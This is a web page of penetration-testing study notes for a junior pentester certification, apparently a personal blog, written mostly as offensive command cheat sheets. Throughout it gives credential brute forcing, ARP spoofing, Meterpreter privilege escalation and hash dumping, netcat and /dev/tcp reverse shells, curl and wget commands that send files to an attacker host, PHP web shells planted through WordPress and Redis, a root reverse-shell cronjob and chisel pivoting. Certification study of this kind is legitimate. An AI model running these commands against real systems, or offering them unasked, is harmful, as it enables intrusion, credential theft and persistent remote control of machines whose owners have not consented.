+<p>rainbow tables:</p>
+<ul>
+  <li>tools: ophcrack #its used only for Windows</li>
+</ul>
+
+<h2 id="hashcat">HASHCAT</h2>
+<p>can use rules as well, to implement certain variations to the normal dictionaries;
+example:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>password/p4ssw0rd/PAssWord!/123password etc
+
+</code></pre></div></div>
+
+<h1 id="network-attacks">NETWORK ATTACKS</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hydra <span class="nt">-l</span> <span class="nt">-p</span> &lt;target&gt; &lt;service&gt;
+
+<span class="nt">-l</span> - fixed user
+<span class="nt">-L</span> - wordlist <span class="k">for </span>user
+<span class="nt">-p</span> - fixed password
+<span class="nt">-P</span> - wordlist <span class="k">for </span>passwords
+
+hydra &lt;IP&gt; &lt;<span class="nb">type</span>: http-post-form&gt; <span class="s2">"&lt;directory-of-login-page&gt;:&lt;user=^USER^&amp;pass=^PASS^:&lt;message of invalid credentials&gt;"</span> <span class="nt">-l</span> &lt;user&gt; <span class="nt">-p</span> &lt;<span class="nb">pwd</span><span class="o">&gt;</span> <span class="nt">-f</span> <span class="o">{</span>to <span class="nb">exit </span>when find a valid login<span class="o">}</span> <span class="nt">-V</span> <span class="o">{</span>verbose, to show us the result<span class="o">}</span>
+
+</code></pre></div></div>
+
+<h1 id="shares">SHARES</h1>
+
+<h2 id="windows">Windows:</h2>
+
+<p>unumerate windows shares:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+nbtstat
+
+nbtstat <span class="nt">-A</span> &lt;IP&gt; <span class="c"># most common, display information about the target</span>
+</code></pre></div></div>
+
+<p>output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Name - Type - Status
+xx    - &lt;00&gt; is a workstation - Registered
+xx    - &lt;20&gt; sharing is up and running- Regustered
+
+NET VIEW &lt;target IP&gt;
+</code></pre></div></div>
+
+<h2 id="linux">Linux:</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmblookup <span class="nt">-A</span> &lt;target ip&gt;
+
+smbclient <span class="nt">-L</span> //&lt;IP&gt; <span class="nt">-N</span> 
+
+<span class="nt">-L</span> <span class="o">=</span> <span class="c">#to look which services are available</span>
+<span class="nt">-N</span> <span class="c">#to force to not ask For password</span>
+</code></pre></div></div>
+
+<p>Checking ‘for’ NULL Sessions with Windows:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net use <span class="se">\\</span>&lt;IP&gt;<span class="se">\I</span>PC<span class="nv">$ </span><span class="s1">''</span> /u: <span class="s1">''</span>
+</code></pre></div></div>
+
+<p>Checking ‘for’ NULL Sessions with Linux</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="se">\\\\</span>&lt;IP&gt;<span class="se">\\</span>IPC<span class="nv">$ </span><span class="nt">-N</span>
+</code></pre></div></div>
+
+<h2 id="tools">TOOLS</h2>
+
+<p>in Windows:</p>
+
+<p>enum:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>enum <span class="nt">-S</span> &lt;IP&gt; <span class="c"># enumerate shares</span>
+enum <span class="nt">-U</span> &lt;IP&gt; <span class="c"># enumerate users</span>
+enum <span class="nt">-P</span> &lt;IP&gt; <span class="c"># check password policy</span>
+</code></pre></div></div>
+
+<p>winfo:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>winfo &lt;IP&gt; <span class="nt">-n</span>
+</code></pre></div></div>
+
+<p>in Linux:
+enum4linux</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>samrdump &lt;IP&gt;
+</code></pre></div></div>
+
+<p>/usr/share/doc/python-impacket-doc/examples/</p>
+
+<p>we can use nmap to enumerate the shares also:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-script</span><span class="o">=</span>smb-enum-shares &lt;IP&gt;
+nmap <span class="nt">-script</span><span class="o">=</span>smb-enum-users &lt;IP&gt;
+nmap <span class="nt">-script</span><span class="o">=</span>smb-brute &lt;IP&gt;
+
+
+nmap <span class="nt">--script</span> smb-check-vulns.exe <span class="nt">--script-args</span><span class="o">=</span><span class="nv">unsafe</span><span class="o">=</span>1 &lt;IP&gt;
+</code></pre></div></div>
+
+<blockquote>
+  <p>[!NOTE] This checks if the machine is vulnerable against well known vulnerabilties</p>
+</blockquote>
+
+<h1 id="arp">ARP</h1>
+
+<blockquote>
+  <p>[!NOTE] its a protocol to resolve ip address into mac address</p>
+</blockquote>
+
+<p>First we need to enable IP Forwarding:</p>
+
+<p>By enabling IP Forwarding, you tell your machine to forward the packets you intercept to the real destination host.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>1 <span class="o">&gt;</span> /proc/sys/net/ipv4/ip_forward
+</code></pre></div></div>
+
+<p>You can then run arpspoof:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+arpspoof <span class="nt">-i</span> &lt;interface&gt; <span class="nt">-t</span> &lt;target&gt; <span class="nt">-r</span> &lt;host&gt;
+
+example:
+
+arpspoof <span class="nt">-i</span> eth0 <span class="nt">-t</span> 192.168.4.11 <span class="nt">-r</span> 192.168.4.16
+</code></pre></div></div>
+
+<blockquote>
+  <p>[!NOTE] You can then run Wireshark and intercept the traffic!</p>
+</blockquote>
+
+<h1 id="meterpreter-1">METERPRETER</h1>
+
+<p>Most used Payloads:</p>
+
+<p>bind_tcp</p>
+
+<ul>
+  <li>Runs a server process on the target machine that waits for connections from the attacker machine</li>
+</ul>
+
+<p>reverse_tcp</p>
+
+<ul>
+  <li>Performs a TCP connection back to the attacker machine. As you saw in the Backdoors chapter, this feature</li>
+  <li>help evade firewall rules</li>
+</ul>
+
+<blockquote>
+  <p>We can use the getsystem to update our privilege, but in modern Windows that is not possible because of the User Account Control
+We can bypass that restriction by using the “bypassuac”</p>
+</blockquote>
+
+<ul>
+  <li>search bypassuac
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use exploit/windows/local/bypassuac
+<span class="nb">set </span>session &lt;session that we want to update privileges&gt;
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<blockquote>
+  <p>in the new meterpreter session, the UAC is disabled, so we can execute the command “getsystem”</p>
+</blockquote>
+
+<ul>
+  <li>hashdump to dump the password databases and save it ‘for’ an offline cracking session;</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use post/windows/gather/hashdump
+<span class="nb">set </span>session &lt;session number&gt;
+</code></pre></div></div>
+
+<p>We can ‘download’ and ‘upload’ files:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s1">'shell'</span> <span class="o">&gt;</span> to run standard operating system shell
+
+run post/windows/gather/win_privs <span class="o">=</span> <span class="nb">whoami</span> /priv
+
+ps
+</code></pre></div></div>
+
+<p>We can migrate to a process to be more stealth:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps <span class="nt">-U</span> SYSTEM or whatever our privileges is<span class="p">;</span>
+
+migrate &lt; PID <span class="o">&gt;</span>
+
+getpid to see <span class="k">if </span>it worked.
+
+hashdump <span class="c"># to hash the pwd and shadow, but only works if we have SYSTEM privilege.</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>get that and run john to crack</p>
+</blockquote>
+
+<p>If we have a session already, we can upgrade to meterpreter session</p>
+
+<p>by using:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>post/multi/manage/shell_to_meterpreter
+<span class="nb">set </span>session &lt;number&gt;
+<span class="nb">set </span>lport and lhost
+run
+
+</code></pre></div></div>
+
+<h1 id="remote-code-executions">Remote Code Executions</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="nv">$PATH</span>
+<span class="c"># visit some of these locations and view what tools are there</span>
+
+<span class="c"># is netcat present?</span>
+which nc
+<span class="c"># is python present?</span>
+which python
+<span class="c"># is curl installed?</span>
+which curl
+<span class="c"># is wget installed?</span>
+which wget
+</code></pre></div></div>
+
+<p>we can use these tools do get shell.</p>
+
+<p>with netcat:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc &lt;IP&gt; &lt;port&gt; <span class="nt">-e</span> /bin/bash
+</code></pre></div></div>
+
+<p>and listening in our kali</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> &lt;port&gt;
+</code></pre></div></div>
+
+<h2 id="with-curl">with CURL</h2>
+<p>In kali:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> &lt;port&gt;
+</code></pre></div></div>
+
+<p>In target:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://&lt;our IP&gt;:&lt;port&gt;
+curl http://&lt;our IP&gt;:&lt;port&gt;/<span class="s1">'whoami'</span>
+curl http://&lt;our IP&gt;:&lt;port&gt;/<span class="s1">'id | base64'</span>
+curl http://&lt;our IP&gt;:&lt;port&gt;/file <span class="nt">-T</span> /etc/issue
+</code></pre></div></div>
+
+<p>We can try to upload a msfvenom payload to the machine.
+msfvenom -p linux/x64/shell_reverse_tcp lhost=<our ip=""> lport=<port> -f elf -o <name></name></port></our></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://&lt;our IP&gt;:&lt;por&gt;/&lt;file&gt; <span class="nt">-o</span> /tmp/r
+<span class="nb">chmod</span> +x /tmp/r
+/tmp/r <span class="c"># run after netcat is listening</span>
+</code></pre></div></div>
+
+<h1 id="privesc-wgelctf">PrivEsc WgelCTF</h1>
+
+<p>user was able to use wget as SUDO…</p>
+
+<p>1:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>wget <span class="nt">--post-file</span> /root/root.txt http://10.10.14.5:443/
+</code></pre></div></div>
+
+<blockquote>
+  <p>I sent the flag through <strong>http.server</strong></p>
+</blockquote>
+
+<p>2:</p>
+<h2 id="create-shadow-file">Create shadow file</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl passwd <span class="nt">-1</span> <span class="nt">-salt</span> 0xdf password
+
+<span class="nb">sudo </span>wget <span class="nt">-O</span> /etc/shadow http://10.10.14.5/shadow
+su -
+</code></pre></div></div>
+
+<p>I did a file a shadow file and overwrote the actual shadow of the machine:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root:<span class="nv">$1$0xdf$fKKvgEPPSu1HMdNI3w5i50</span>:18195:0:99999:7:::
+</code></pre></div></div>
+
+<blockquote>
+  <p>so when the command <strong>su -</strong> is written, I get root access.</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@CorpOne:~# <span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div></div>
+
+<h1 id="extra-notes">Extra notes</h1>
+
+<table>
+  <thead>
+    <tr>
+      <th>Service</th>
+      <th>User</th>
+      <th>Password</th>
+      <th>Notes</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Wordpress</td>
+      <td>administrator</td>
+      <td> </td>
+      <td> </td>
+    </tr>
+  </tbody>
+</table>
+
+<blockquote>
+  <p>Wordpress
+Appearance &gt; theme-editor &gt; select a theme that is not in use &gt; 404 Template &gt; edit your php file</p>
+</blockquote>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?php system<span class="o">(</span><span class="nv">$_REQUEST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span> ?&gt;
+</code></pre></div></div>
+
+<p>dominio/main/wp-content/themes/<theme>/404.php?cmd=whoami</theme></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt; 0&gt;&amp;1'</span> <span class="c"># You can encode with burp before send</span>
+curl &lt;ip:port&gt;
+</code></pre></div></div>
+
+<h2 id="copy-cat-command">COPY cat command</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>reverse-shell.php | xclip <span class="nt">-selection</span> clipboard
+</code></pre></div></div>
+
+<p>After open a python server to send a file:</p>
+
+<p>grab with curl:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl &lt;ip:port&gt;/linpeas.sh | bash or sh <span class="c"># this will execute directly</span>
+</code></pre></div></div>
+
+<h2 id="better-shell">Better shell</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">{</span>
+python <span class="nt">-c</span> <span class="s2">"import pty;pty.spawn('/bin/bash')"</span>
+crtl + z
+<span class="nb">stty </span>raw <span class="nt">-echo</span>
+<span class="nb">fg
+</span>enter
+enter
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Discovery Web Content: dirb, gobuster, dirsearch</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf <span class="nt">-u</span> &lt;url&gt;/FUZZ <span class="nt">-w</span> &lt;wordlist&gt;
+ffuf <span class="nt">-u</span> &lt;url&gt;/FUZZ-- <span class="nt">-w</span> &lt;wordlist-special-chars&gt; <span class="nt">-mc</span> 200,500 <span class="nt">-fw</span> 9
+</code></pre></div></div>
+
+<h2 id="gobuster---web-enumeration">GOBUSTER - WEB ENUMERATION</h2>
+
+<h3 id="try-to-find-directories">try to find directories</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster <span class="nb">dir</span> <span class="nt">-w</span> /opt/Seclists/Discovery/Web-Content/raft-small-words.txt <span class="nt">-x</span> php <span class="nt">-u</span> &lt;url&gt; <span class="nt">-o</span> gobuster/dir-root.log
+</code></pre></div></div>
+
+<h3 id="try-to-find-subdomains">try to find subdomains</h3>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster vhost <span class="nt">-w</span> /opt/Seclists/Discovery/DNS/subdomains-topmillion-110000.txt <span class="nt">-u</span> &lt;url&gt; <span class="nt">-o</span> gobuster/vhist-sub.txt
+</code></pre></div></div>
+
+<blockquote>
+  <p>We can save the request of a login from burp/zap with copy to file. <strong>request.req</strong></p>
+</blockquote>
+
+<h2 id="sqlmap-1">SQLMAP</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-r</span> &lt;login.req&gt; <span class="nt">--batch</span>
+sqlmap <span class="nt">-r</span> &lt;login.req&gt; <span class="nt">--batch</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3
+</code></pre></div></div>
+
+<h2 id="grep">GREP</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> &lt;file&gt; | <span class="nb">grep</span> <span class="nt">-v</span> &lt;somethin&gt; <span class="c"># show everything except lines with &lt;something&gt;</span>
+</code></pre></div></div>
+
+<p>WITH LOGINS:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>we can try to register 'admin&lt;space&gt;' 
+sometimes the site register the same username of 'admin' and when we try to login
+we have admin privileges to the web server
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> /etc/passwd | <span class="nb">grep </span>sh<span class="nv">$ </span>| <span class="nb">awk</span> <span class="nt">-F</span> <span class="s1">'{print 1$}'</span> <span class="c"># print all the usernames that finish with sh</span>
+
+
+poetry run CrackMapExec ssh &lt;url&gt; <span class="nt">-u</span> &lt;<span class="nb">users </span>file&gt; <span class="nt">-p</span> &lt;<span class="nb">pwd </span>file&gt;
+</code></pre></div></div>
+
+<p>zcap can read gzip files like a cat:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zcap access.log.<span class="k">*</span>.gz | <span class="nb">grep</span> <span class="nt">-iv</span> <span class="s1">'a\|b\|c'</span>
+</code></pre></div></div>
+
+<h2 id="aureport">AUREPORT</h2>
+
+<p>Can do a report upon the logs files.</p>
+
+<p>example:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aureport <span class="nt">--tty</span> <span class="c"># to show terminals access </span>
+</code></pre></div></div>
+
+<h1 id="pivot">Pivot</h1>
+
+<p><strong>In kali</strong>:</p>
+
+<p>create a directory: /www</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server
+nc <span class="nt">-lvnp</span> 8000 &lt; <span class="o">{</span>file we want to send<span class="o">}</span>
+</code></pre></div></div>
+
+<p><strong>In target</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl &lt;ip&gt;:&lt;port&gt;/&lt;file&gt;	
+wget http://&lt;ip&gt;:&lt;port&gt;/file
+<span class="nb">cat</span> &lt; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt; <span class="c"># to get the output of the file</span>
+bash <span class="nt">-c</span> <span class="s2">"cat &lt; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt;"</span> <span class="c"># if the shell isnt bash, try to execute as bash</span>
+bash <span class="nt">-c</span> <span class="s2">"cat &lt; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt; &gt; /dev/shm/LinEnum.sh"</span> <span class="c"># try to send to a file</span>
+bash <span class="nt">-c</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt; 0&gt;&amp;1"</span> <span class="c"># to get reverse shell</span>
+</code></pre></div></div>
+
+<ul>
+  <li>It works like fping -a -g - but sometimes the target does not have this option
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>ip <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 5<span class="si">)</span><span class="p">;</span> <span class="k">do </span>ping <span class="nt">-c</span> 1 &lt; x.x.x.<span class="nv">$ip</span> <span class="o">&gt;</span> /dev/null <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Online: x.x.x.</span><span class="nv">$ip</span><span class="s2">"</span><span class="p">;</span> <span class="k">done</span>
+</code></pre></div>    </div>
+  </li>
+  <li>nmap inside machine without nmap
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>port <span class="k">in</span> <span class="si">$(</span><span class="nb">seq </span>1 65535<span class="si">)</span><span class="p">;</span> <span class="k">do</span> <span class="o">(</span><span class="nb">echo </span>scan <span class="o">&gt;</span> /dev/tcp/&lt;target ip&gt;/<span class="nv">$port</span> <span class="o">&amp;&amp;</span> <span class="nb">echo</span> <span class="s2">"Open: </span><span class="nv">$port</span><span class="s2">"</span><span class="o">)</span> 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<h2 id="pivot-with-chisel">PIVOT with CHISEL</h2>
+
+<p><strong>IN Kali</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chisel server <span class="nt">-p</span> 8000 <span class="nt">-reverse</span> <span class="nt">-v</span>
+</code></pre></div></div>
+
+<p>after the handshake with the chisel server:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		curl localhost:8001
+</code></pre></div></div>
+
+<p><strong>In Target</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chisel client &lt;kali ip&gt;:8000 R:8001:&lt;target ip&gt;:80 
+<span class="c"># This will open port 8001 of our kali to send data through the tunneling network to port 80 of the target</span>
+
+chisel client &lt;kali ip&gt;:8000 R:8001:127.0.0.1:&lt;target ip&gt;:80 
+<span class="c"># Its a bit more secure, cause we only can access though the localhost</span>
+
+chisel client &lt;kali ip&gt;:8000 R:127.0.0.1:6379:&lt;target ip&gt;:6379	
+<span class="c"># We can access the 6379 port of the target in our machine by localhost:&lt;port we just opened&gt;</span>
+
+nmap <span class="nt">-sT</span> <span class="nt">-p</span> &lt;port&gt; <span class="nt">-sC</span> <span class="nt">-sV</span> localhost <span class="nt">-oA</span> nmap/name-u-want
+</code></pre></div></div>
+
+<p>We can visualize the open port with netstat:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>netstat <span class="nt">-alnp</span> | <span class="nb">grep </span>8001
+</code></pre></div></div>
+
+<h2 id="local-pivot">LOCAL PIVOT</h2>
+
+<p><strong>In Kali</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chisel server <span class="nt">-p</span> 8000
+</code></pre></div></div>
+
+<p><strong>In target</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chisel client &lt;kali ip&gt;:&lt;port&gt; 9001:127.0.0.1:8001
+<span class="c"># this open the 9001 of the target and tunnel with our 8001 port</span>
+
+chisel client &lt;kali ip&gt;:&lt;port&gt; 9001:1&lt; another target ip <span class="o">&gt;</span>:445
+<span class="c"># to open a windows box through tunneling</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>telnet or nc localhost &lt;port&gt;
+flushall
+<span class="nb">set </span>AnyText <span class="s2">"&lt;? system(</span><span class="nv">$_REQUEST</span><span class="s2">['cmd']); ?&gt;"</span>
+config <span class="nb">set </span>dbfilename shell.php
+config <span class="nb">set dir</span> /var/www/html/
+
+Then we can open <span class="k">in </span>the browser ip/shell.php?cmd<span class="o">=</span>&lt;<span class="nb">command</span><span class="o">&gt;</span> 
+<span class="c"># problably what we want is a reverse shell</span>
+<span class="c"># so we cam grab in pentest monkey</span>
+</code></pre></div></div>
+
+<p>Do a CRONJOB in target:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"* * * * * root bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt; 0&gt;&amp;1'"</span> <span class="o">&gt;</span> runme
+</code></pre></div></div>
+
+<p>send with rsync:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>rsync <span class="nt">-a</span> runme rsync://backup:873/src/etc/cron.d/runme
+</code></pre></div></div>
+
+<p>We can send commands base64 encoded, if the shell of the target machine is not accepting out request;</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/&lt;kali ip&gt;/&lt;port&gt; 0&gt;&amp;1'</span> | <span class="nb">base64</span>
+</code></pre></div></div>
+
+<p>get the output:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"* * * * * root bash -c 'output in base64 | base64 -d"</span> <span class="o">&gt;</span> runme
+</code></pre></div></div>
+
+<h2 id="reverse-socks">REVERSE SOCKS</h2>
+
+<p><strong>In Kali</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chisel server <span class="nt">-p</span> 8000 <span class="nt">-reverse</span> <span class="nt">-v</span>
+</code></pre></div></div>
+
+<p><strong>In Target</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chisel client &lt;kali ip&gt;:8000 R:8001:127.0.0.1:1337
+chisel server <span class="nt">-p</span> 1337 <span class="nt">--socks5</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>Will redirect everything from our port 8001 to port 1337 of the target</p>
+</blockquote>
+
+<p><strong>In Kali again</strong>:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chisel client 127.0.0.1:8001 socks
+</code></pre></div></div>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#begginer" class="page__taxonomy-item" rel="tag">begginer</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#pentest" class="page__taxonomy-item" rel="tag">pentest</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#review" class="page__taxonomy-item" rel="tag">review</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#notes" class="page__taxonomy-item" rel="tag">notes</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2023-11-18T00:00:00+06:00">November 18, 2023</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+    <h4 class="page__share-title">Share on</h4>
+  
+
+  <a href="https://twitter.com/intent/tweet?text=eLearnSecurity+Junior+Penetration+Tester%20http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fejpt%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fejpt%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fnotes%2Fejpt%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="#" class="pagination--pager disabled">Previous</a>
+    
+    
+      <a href="/review/ecppt/" class="pagination--pager" title="eLearnSecurity Certified Professional Penetration Tester
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://kit.fontawesome.com/4eee35f757.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+  
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+  
+    <script src="/assets/js/clipboard.js"></script>
+  
+
+
+
+  </body>
+</html>
